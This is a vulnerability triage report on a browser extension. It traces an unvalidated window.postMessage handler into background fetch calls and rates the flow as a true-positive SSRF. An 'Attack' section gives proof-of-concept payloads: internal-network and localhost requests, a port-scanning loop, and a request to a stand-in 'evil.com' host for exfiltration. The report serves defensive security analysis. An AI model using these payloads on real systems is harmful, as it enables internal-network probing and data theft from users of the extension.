# CoCo Analysis: mfmmilpkngnjkmjanbmhnocdidcbkljd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: cs_window_eventListener_message → fetch_resource_sink (event.data.url)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mfmmilpkngnjkmjanbmhnocdidcbkljd/opgen_generated_files/cs_0.js
Line 547: `window.addEventListener("message", function (event) {...})`
Line 549: `const liveUrl = event.data.url;`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mfmmilpkngnjkmjanbmhnocdidcbkljd/opgen_generated_files/bg.js
Line 1016: `fetch(liveUrl, { method: 'GET', mode: 'cors' })`

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 547)
window.addEventListener("message", function (event) {
  if (event.data && event.data.type === "checkLiveStatus") {
    const liveUrl = event.data.url;      // ← attacker-controlled
    const cdn = event.data.cdn;          // ← attacker-controlled
    const uri = event.data.uri;          // ← attacker-controlled

    chrome.runtime.sendMessage(
      { action: 'checkLiveStatus', url: liveUrl, cdn: cdn, uri: uri },
      (response) => {
        if (response && response.live !== undefined) {
          updateLiveButton(response.live);
        }
      }
    );
  }
});

// Background script - Message handler (bg.js Line 1000)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'checkLiveStatus') {
    const liveUrl = request.url;    // ← attacker-controlled
    const cdn = request.cdn;        // ← attacker-controlled
    const uri = request.uri;        // ← attacker-controlled

    const cdnUrl = cdn + uri;       // ← attacker-controlled concatenation

    fetch(liveUrl, { method: 'GET', mode: 'cors' })  // SSRF sink #1
      .then(response => {
        if (!response.ok) {
          sendResponse({ live: false });
          return;
        }

        // If the live URL fetch succeeds, proceed to check the CDN URL
        return fetch(cdnUrl, { method: 'GET', mode: 'cors' });  // SSRF sink #2
      })
      .then(response => {
        if (response && response.status === 200) {
          sendResponse({ live: true });
        } else {
          sendResponse({ live: false });
        }
      })
      .catch(error => {
        sendResponse({ live: false });
      });

    return true;  // Keep the message channel open for async response
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// From any webpage on floatplane.com domains
// (e.g., via XSS, malicious content, or compromised page)

// Attack 1: SSRF to internal network
window.postMessage({
  type: "checkLiveStatus",
  url: "http://192.168.1.1/admin",
  cdn: "http://localhost:",
  uri: "8080/internal-api"
}, "*");

// Attack 2: SSRF to external services
window.postMessage({
  type: "checkLiveStatus",
  url: "https://internal-api.company.com/secrets",
  cdn: "https://evil.com/",
  uri: "steal?data=pwned"
}, "*");

// Attack 3: Port scanning
for (let port = 8000; port < 9000; port++) {
  window.postMessage({
    type: "checkLiveStatus",
    url: "http://127.0.0.1:" + port,
    cdn: "http://127.0.0.1:",
    uri: port
  }, "*");
}
```

**Impact:**
Server-Side Request Forgery (SSRF) vulnerability allowing attackers to make the extension perform privileged cross-origin HTTP requests to arbitrary URLs. The attacker can:
1. Access internal network resources (localhost, 192.168.x.x, 10.x.x.x)
2. Perform port scanning on internal networks
3. Bypass CORS restrictions to access external APIs with the extension's elevated privileges
4. Potentially exfiltrate data by making requests to attacker-controlled servers

While the content script only runs on floatplane.com domains (per manifest.json), any attacker with the ability to execute JavaScript on these domains (e.g., via XSS, malicious ads, or compromised content) can exploit this vulnerability. Per the methodology, even if only ONE specific domain can exploit it, this is classified as TRUE POSITIVE.

---

## Sink 2: cs_window_eventListener_message → fetch_resource_sink (event.data.cdn)

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 1. The `cdn` parameter is concatenated with `uri` to create `cdnUrl` which is then used in the second fetch call at line 1025. This allows the attacker to control both parts of the URL construction.

---

## Sink 3: cs_window_eventListener_message → fetch_resource_sink (event.data.uri)

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 1. The `uri` parameter is concatenated with `cdn` to create `cdnUrl` which is then used in the second fetch call at line 1025. This allows the attacker to control both parts of the URL construction.
